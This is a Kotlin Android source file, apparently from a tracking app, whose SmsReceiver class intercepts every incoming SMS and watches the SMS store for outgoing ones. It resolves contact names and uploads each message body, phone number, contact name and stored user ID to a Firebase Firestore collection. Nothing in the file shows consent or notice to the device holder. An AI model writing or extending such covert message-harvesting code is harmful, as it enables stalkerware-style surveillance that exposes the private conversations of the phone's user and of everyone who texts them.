package com.netra.tracker

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Context.MODE_PRIVATE
import android.content.Intent
import android.content.SharedPreferences
import android.database.ContentObserver
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.provider.ContactsContract
import android.telephony.SmsMessage
import android.util.Log
import com.google.firebase.firestore.FirebaseFirestore

class SmsReceiver : BroadcastReceiver() {
    private var lastSentSmsId: Long = -1  // Store last logged outgoing SMS ID
    private lateinit var sharedPreferences: SharedPreferences

    override fun onReceive(context: Context, intent: Intent) {
        Log.d("onReceive", "onReceive SMS: ----------------------------------")

        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            trackIncomingSms(intent,context)
        }
    }

    private fun trackIncomingSms(intent: Intent, context: Context) {
        val bundle: Bundle? = intent.extras
        if (bundle != null) {
            val pdus = bundle["pdus"] as Array<*>
            val messages = pdus.map { SmsMessage.createFromPdu(it as ByteArray) }
            // Grouping messages by originating address (sender)
            val messageMap = mutableMapOf<String, StringBuilder>()

            for (message in messages) {
                val sender = message.originatingAddress ?: "Unknown"
                val content = message.messageBody

                // Combine messages from the same sender
                if (!messageMap.containsKey(sender)) {
                    messageMap[sender] = StringBuilder()
                }
                messageMap[sender]?.append(content)
            }

            // Process the complete messages
            for ((sender, completeMessage) in messageMap) {
                val contactName = getContactName(context, sender) ?: sender
                insertSmsToFirebase(context, "Incoming", completeMessage.toString(), "1", sender, contactName.toString())
                logToFirebase("Incoming SMS from $sender: $completeMessage")
            }
        }
    }



    fun startOutgoingSmsTracking(context: Context) {
        val handler = Handler()
        val smsObserver = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean) {
                super.onChange(selfChange)
                trackOutgoingSms(context)
            }
        }
        context.contentResolver.registerContentObserver(Uri.parse("content://sms/"), true, smsObserver)
    }

    private fun trackOutgoingSms(context: Context) {
        val sharedPreferences = context.getSharedPreferences("SmsTrackerPrefs", Context.MODE_PRIVATE)

        val uri = Uri.parse("content://sms/sent")
        val projection = arrayOf("_id", "address", "body", "date")

        val cursor = context.contentResolver.query(
            uri, projection, null, null, "date DESC LIMIT 1"
        )

        cursor?.use {
            if (it.moveToFirst()) {
                val smsId = it.getLong(it.getColumnIndexOrThrow("_id"))
                val lastSentSmsId = sharedPreferences.getLong("lastSentSmsId", -1)

                Log.d("SmsReceiver", "Fetched SMS ID: $smsId, Last Logged ID: $lastSentSmsId")

                if (smsId != lastSentSmsId) {  // Log only if it's a new SMS
                    sharedPreferences.edit().putLong("lastSentSmsId", smsId).apply()

                    val recipient = it.getString(it.getColumnIndexOrThrow("address"))
                    val contactName = getContactName(context, recipient) ?: recipient // Get contact name or fallback to number
                    val message = it.getString(it.getColumnIndexOrThrow("body"))
                    insertSmsToFirebase(context,"Outgoing",message.toString(),"2",recipient,contactName.toString())
                    logToFirebase("Outgoing SMS to $recipient: $message")
                } else {

                }
            } else {
                Log.d("SmsReceiver", "No outgoing SMS found in database")
            }
        } ?: Log.d("SmsReceiver", "Cursor is null - Could not access SMS database")
    }

    private fun logToFirebase(message: String) {
        Log.d("SmsReceiver", "Tracking SMS: $message")
    }
}

// Function to get contact name from phone number
private fun getContactName(context: Context, phoneNumber: String): String? {
    val uri: Uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber))
    val projection = arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME)

    context.contentResolver.query(uri, projection, null, null, null).use { cursor ->
        if (cursor != null && cursor.moveToFirst()) {
            return cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.PhoneLookup.DISPLAY_NAME))
        }
    }
    return null
}

private fun insertSmsToFirebase(context: Context, smsType: String, msg: String?,type: String,phoneNumber: String?, contactName: String?) {
    val userData = getUserDataFromNative(context)
    val db = FirebaseFirestore.getInstance()
    val timestampMillis = System.currentTimeMillis()
    val smsData = mapOf(
        "id" to timestampMillis,
        "userId" to (userData?.get("userId") ?: ""),
        "username" to (userData?.get("username") ?: ""),
        "phoneNumber" to (phoneNumber ?: ""),
        "contactName" to (contactName ?: ""),
        "smsType" to smsType,
        "message" to (msg ?: "Unknown"),
        "type" to type,
        "timestamp" to timestampMillis
    )

    db.collection("sms")
        .document(timestampMillis.toString())
        .set(smsData)
        .addOnSuccessListener {
            println("sms data inserted successfully")
        }
        .addOnFailureListener { e ->
            println("Error inserting call data: ${e.message}")
        }
}



private fun getUserDataFromNative(context: Context): Map<String, String>? {
    val sharedPreferences: SharedPreferences = context.getSharedPreferences("FlutterSharedPrefs", MODE_PRIVATE)
    val userId = sharedPreferences.getString("userId", null)
    val username = sharedPreferences.getString("username", null)

    return if (userId != null && username != null) {
        mapOf("userId" to userId, "username" to username)
    } else {
        null
    }
}

